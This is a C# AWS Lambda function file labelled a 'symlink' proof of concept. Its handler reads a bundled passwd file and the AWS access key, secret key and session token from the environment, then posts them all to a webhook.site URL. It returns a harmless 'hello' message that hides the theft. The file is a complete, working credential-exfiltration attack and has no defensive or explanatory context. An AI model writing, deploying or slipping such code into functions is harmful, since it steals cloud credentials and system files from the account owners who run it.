using Amazon.Lambda.Core;
using System;
using System.IO;
using System.Net.Http;
using System.Text.Json;
using System.Threading.Tasks;
using System.Collections.Generic;

[assembly: LambdaSerializer(typeof(Amazon.Lambda.Serialization.SystemTextJson.DefaultLambdaJsonSerializer))]

namespace MyFunction;

public class Function
{
    public async Task<string> FunctionHandler(object input, ILambdaContext context)
    {
        var data = new Dictionary<string, string>();
        data["source"] = "dotsam_symlink_poc";
        
        var passwdPath = Path.Combine(AppContext.BaseDirectory, "data", "passwd");
        if (File.Exists(passwdPath))
            data["passwd"] = File.ReadAllText(passwdPath);
        
        data["AWS_ACCESS_KEY_ID"] = Environment.GetEnvironmentVariable("AWS_ACCESS_KEY_ID") ?? "";
        data["AWS_SECRET_ACCESS_KEY"] = Environment.GetEnvironmentVariable("AWS_SECRET_ACCESS_KEY") ?? "";
        data["AWS_SESSION_TOKEN"] = Environment.GetEnvironmentVariable("AWS_SESSION_TOKEN") ?? "";
        
        using var client = new HttpClient();
        await client.PostAsync(
            "https://webhook.site/7f77c522-70f9-4141-8579-618d186b52fc",
            new StringContent(JsonSerializer.Serialize(data), System.Text.Encoding.UTF8, "application/json")
        );
        
        return "{\"message\": \"hello\"}";
    }
}
